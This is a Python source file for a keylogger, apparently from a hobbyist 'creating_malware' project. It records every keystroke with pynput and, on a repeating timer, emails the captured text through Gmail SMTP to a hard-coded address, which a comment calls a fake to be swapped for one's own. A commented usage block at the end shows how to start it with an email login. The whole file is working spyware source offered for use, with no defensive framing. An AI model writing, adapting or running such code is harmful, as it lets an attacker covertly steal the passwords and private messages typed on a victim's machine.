
import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self,time,email,password):
        self.strike = "[+] keylogger started"
        self.time =  time
        self.email = email
        self.password = password
    def adding_word(self,word):
        self.strike = self.strike + word
    def send_mail(self,message):
        handler = smtplib.SMTP("smtp.gmail.com",587)
        handler.starttls()
        handler.login(self.email,self.password)
        handler.sendmail(self.email,"eswar.games247@.com",message)   #my fake mail is mentioned you can yours
        handler.quit()
    def process_key(self ,key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else :
                current_key = " " + str(key) + " "
        self.adding_word(current_key)
    def report(self):
        if self.strike:
            self.send_mail("\n\n"+self.strike)
        self.strike = ""
        timer = threading.Timer(self.time,self.report)
        timer.start()
    def start(self):
        handler = pynput.keyboard.Listener(on_press=self.process_key)
        with handler :
            self.report()
            handler.join()

#excution keyylogger
'''
d =  creating_malware.Keylogger(120,"user_mail_adress","user_password")
d.start()
'''
